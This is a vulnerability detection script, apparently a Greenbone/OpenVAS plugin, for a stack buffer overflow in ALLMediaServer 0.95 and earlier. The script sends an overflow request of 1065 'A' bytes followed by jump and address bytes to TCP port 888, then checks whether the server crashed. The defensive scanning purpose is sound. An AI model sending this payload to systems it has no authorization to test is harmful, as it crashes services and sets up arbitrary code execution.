if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803745" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-08-22 10:39:02 +0530 (Thu, 22 Aug 2013)" );
	script_name( "ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability" );
	script_tag( name: "summary", value: "The host is running ALLMediaServer and is prone to stack based buffer overflow
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and check the server crashed or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "The flaw is due to a boundary error when processing certain network requests
  and can be exploited to cause a stack based buffer overflow via a specially
  crafted packet sent to TCP port 888." );
	script_tag( name: "affected", value: "ALLMediaServer version 0.95 and prior." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary code in
  the context of the application. Failed attacks will cause denial of service conditions." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122912" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122913" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/allmediaserver-095-buffer-overflow" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 888 );
	script_mandatory_keys( "ALLPLAYER-DLNA/banner" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 888 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: ALLPLAYER-DLNA" )){
	http_close_socket( soc );
	exit( 0 );
}
req = crap( data: "A", length: 1065 ) + "\\xEB\\x06\\xFF\\xFF" + "\\x54\\x08\\x6f\\x00";
send( socket: soc, data: req );
http_close_socket( soc );
sleep( 3 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

